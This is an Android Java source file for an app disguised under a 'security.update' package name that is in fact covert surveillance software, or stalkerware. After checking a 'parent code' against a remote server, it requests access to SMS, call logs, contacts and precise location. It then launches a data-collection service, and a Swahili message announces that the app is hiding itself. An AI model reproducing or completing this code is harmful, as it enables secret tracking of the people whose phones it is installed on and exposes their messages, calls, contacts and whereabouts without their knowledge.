package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PermissionActivity extends AppCompatActivity {
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;

    private final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission);

        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);

        if (!savedCode.isEmpty() && isVerified && checkAllPermissions()) {
            startStealthMode();
            return;
        }

        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);

        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();

            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }

            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }

            verifyParentCode(code);
        });
    }

    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    runOnUiThread(() -> {
                        saveParentCode(code);
                        requestAllPermissions();
                    });
                } else {
                    runOnUiThread(() -> 
                        Toast.makeText(PermissionActivity.this, 
                            "Parent code si sahihi!", Toast.LENGTH_LONG).show());
                }
            } catch (Exception e) {
                runOnUiThread(() -> 
                    Toast.makeText(PermissionActivity.this, 
                        "Hitilafu ya mtandao!", Toast.LENGTH_LONG).show());
            }
        }).start();
    }

    private void saveParentCode(String code) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putBoolean("code_verified", true);
        editor.apply();
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "Ruhusa zimepewa... App inajificha!", Toast.LENGTH_SHORT).show();
                startStealthMode();
            } else {
                Toast.makeText(this, "Ruhusa zote zinahitajika! Tafadhali kubali.", Toast.LENGTH_LONG).show();
                requestAllPermissions();
            }
        }
    }

    private void startStealthMode() {
        Intent serviceIntent = new Intent(this, DataCollectionService.class);
        startService(serviceIntent);
        finish();
        moveTaskToBack(true);
    }

    private boolean checkAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    protected void onResume() {
        super.onResume();
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (!savedCode.isEmpty() && isVerified && checkAllPermissions()) {
            startStealthMode();
        }
    }
}
